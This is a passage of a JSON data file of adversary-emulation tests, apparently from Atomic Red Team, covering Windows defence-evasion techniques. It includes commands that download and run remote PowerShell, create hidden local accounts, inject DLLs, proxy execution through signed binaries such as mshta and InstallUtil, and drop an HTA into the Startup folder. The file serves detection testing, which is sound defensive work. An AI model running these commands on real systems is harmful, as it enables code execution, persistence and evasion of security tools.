#{file_name}) { exit 0 } else { exit 1 }\\n"], "input_arguments": [{"key": "file_name", "value": "$env:TEMP\\\\T1564.004_has_ads_powershell.txt"}, {"key": "ads_filename", "value": "adstest.txt"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item \\"$env:TEMP\\\\extracted.exe\\" -ErrorAction Ignore\\n", "command": ["$macro = [System.IO.File]::ReadAllText(\\"PathToAtomicsFolder\\\\T1564\\\\src\\\\T1564-macrocode.txt\\")\\n$macro = $macro -replace \\"aREPLACEMEa\\"", " \\"PathToAtomicsFolder\\\\T1564\\\\bin\\\\extractme.bin\\"\\nIEX (iwr \\"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-MalDoc.ps1\\" -UseBasicParsing)\\nInvoke-Maldoc -macroCode \\"$macro\\" -officeProduct \\"Word\\" -sub \\"Extract\\" -NoWrap\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Extract binary files via VBA", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["try {\\n  New-Object -COMObject \\"Word.Application\\" | Out-Null\\n  Stop-Process -Name \\"winword\\"\\n  exit 0\\n} catch { exit 1 }\\n"], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "net user $ /DELETE 2>&1", "command": ["net user $ ATOMIC123! /add /active:yes"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create a user called \\"$\\" as noted here", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "Remove-LocalUser -Name \\"Administrator \\" 2>&1 | out-null", "command": ["New-LocalUser -Name \\"Administrator \\" -NoPassword"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Create an \\"Administrator \\" user (with a space on the end)", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["mavinject.exe #{process_id} /INJECTRUNNING #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "mavinject - Inject DLL into running process", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "process_id", "value": "1000"}, {"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\x64\\\\T1218.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["SyncAppvPublishingServer.exe \\"n; #{powershell_code}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "SyncAppvPublishingServer - Execute arbitrary PowerShell code", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": [], "input_arguments": [{"key": "powershell_code", "value": "Start-Process calc.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["C:\\\\Windows\\\\SysWow64\\\\Register-CimProvider.exe -Path #{dll_payload}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Register-CimProvider - Execute evil dll", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{dll_payload}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "dll_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Win32\\\\T1218-2.dll"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["InfDefaultInstall.exe #{inf_to_execute}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InfDefaultInstall.exe .inf Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{inf_to_execute}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "inf_to_execute", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\Infdefaultinstall.inf"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["FOR /F \\"tokens=2*\\" %a in ('reg query \\"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\Winword.exe\\" /V PATH') do set microsoft_wordpath=%b\\ncall \\"%microsoft_wordpath%\\\\protocolhandler.exe\\" \\"ms-word:nft|u|#{remote_url}\\"\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "ProtocolHandler.exe Downloaded a Suspicious File", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"(Resolve-Path \\"C:\\\\Program Files*\\\\Microsoft Office\\\\root\\\\Office16\\")\\\\protocolhandler.exe\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "remote_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{mwcpath}\\\\#{mwcname} \\"#{xml_payload}\\" output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Microsoft.Workflow.Compiler.exe Payload Execution", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{mwcpath}\\\\#{mwcname} ) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["#{renamed_binary} #{xml_payload} output.txt\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Renamed Microsoft.Workflow.Compiler.exe Payload Executions", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["Copy-Item #{mwcpath}\\\\#{mwcname} \\"#{renamed_binary}\\" -Force\\nif (Test-Path \\"#{renamed_binary}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "xml_payload", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\T1218.xml"}, {"key": "renamed_binary", "value": "PathToAtomicsFolder\\\\T1218\\\\src\\\\svchost.exe"}, {"key": "mwcpath", "value": "C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\v4.0.30319"}, {"key": "mwcname", "value": "microsoft.workflow.compiler.exe"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke-ATHRemoteFXvGPUDisablementCommand base test", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHRemoteFXvGPUDisablementCommand']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "module_name", "value": "foo"}, {"key": "module_path", "value": "$PWD"}], "execution_status": "Pass"}, {"cleanup": "NA", "command": ["control.exe #{cpl_file_path}\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Control Panel Items", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path #{cpl_file_path}) {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "cpl_file_path", "value": "PathToAtomicsFolder\\\\T1218.002\\\\bin\\\\calc.cpl"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "CheckIfInstallable method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "CheckIfInstallable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallHelper method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "InstallHelper"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil class constructor method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Install_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Install method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /U `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Uninstall method call - /U variant", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_Uninstall_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\nRemove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"#{assembly_dir}\\"\\n$InstallerAssemblyFileName = \\"#{assembly_filename}\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"/? `\\"$InstallerAssemblyFullPath`\\"\\"\\n$ExpectedOutput = 'Constructor_HelpText_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n    CommandLine = $CommandLine\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil HelpText method call", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}, {"key": "assembly_dir", "value": "$Env:TEMP\\\\"}, {"key": "invocation_method", "value": "Executable"}, {"key": "assembly_filename", "value": "T1218.004.dll"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["# Import the required test harness function", " Invoke-BuildAndInvokeInstallUtilAssembly\\n. #{test_harness}\\n\\n$InstallerAssemblyDir = \\"$Env:windir\\\\System32\\\\Tasks\\"\\n$InstallerAssemblyFileName = 'readme.txt'\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$CommandLine = \\"readme.txt\\"\\n$ExpectedOutput = 'Constructor_'\\n\\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\\nSet-Location \\"$Env:windir\\\\System32\\\\Tasks\\"\\n\\nCopy-Item -Path \\"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\\" -Destination \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\"\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = 'Executable'\\n    CommandLine = $CommandLine\\n    InstallUtilPath = \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\"\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\"\\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\"@\\n}\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "InstallUtil evasive invocation", "created_date": "30/07/2021", "post_command": [], "modified_date": "", "pre-requisite": ["if (Test-Path \\"#{test_harness}\\") {exit 0} else {exit 1}\\n"], "input_arguments": [{"key": "test_harness", "value": "PathToAtomicsFolder\\\\T1218.004\\\\src\\\\InstallUtilTestHarness.ps1"}], "execution_status": "Pass"}, {"cleanup": "Remove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.txt\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallLog\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\readme.InstallState\\" -ErrorAction Ignore\\nRemove-Item -Path \\"$Env:windir\\\\System32\\\\Tasks\\\\notepad.exe\\" -ErrorAction Ignore\\n", "command": ["mshta vbscript:Execute(\\"CreateObject(\\"\\"Wscript.Shell\\"\\").Run \\"\\"powershell -noexit -file PathToAtomicsFolder\\\\T1218.005\\\\src\\\\powershell.ps1\\"\\":close\\")\\n"], "executor": "command_prompt", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mshta executes VBScript to execute malicious command", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["$var =Invoke-WebRequest \\"#{hta_url}\\"\\n$var.content|out-file \\"#{temp_file}\\"\\nmshta \\"#{temp_file}\\"\\n"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Mshta Executes Remote HTML Application (HTA)", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": [], "input_arguments": [{"key": "temp_file", "value": "$env:appdata\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\T1218.005.hta"}, {"key": "hta_url", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "script_engine", "value": "JScript"}, {"key": "hta_file_path", "value": "Test.hta"}, {"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Jscript Engine Simulating Double Click", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "script_engine", "value": "JScript"}, {"key": "hta_file_path", "value": "Test.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -HTAUri #{hta_uri} -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - Direct download from URI", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "mshta_file_path", "value": "$env:windir\\\\system32\\\\mshta.exe"}, {"key": "hta_uri", "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -UseRundll32 -Rundll32FilePath #{rundll32_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], "input_arguments": [{"key": "rundll32_file_path", "value": "$env:windir\\\\system32\\\\rundll32.exe"}, {"key": "script_engine", "value": "JScript"}, {"key": "protocol_handler", "value": "About"}], "execution_status": "Pass"}, {"cleanup": "remove-item \\"#{temp_file}\\" -ErrorAction Ignore\\n", "command": ["Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}"], "executor": "powershell", "platform": "windows", "file_name": "", "pre_command": [], "ability_name": "Invoke HTML Application - JScript Engine with Inline Protocol Handler", "created_date": "30/07/2021", "post_command": [], "modified_date": "30/07/2021", "pre-requisite": ["$RequiredModule = Get-Module -Name AtomicTestHarnesses -ListAvailable\\nif (-not $RequiredModule) {exit 1}\\nif (-not $RequiredModule.ExportedCommands['Invoke-ATHHTMLApplication']) {exit 1} else {exit 0}"], 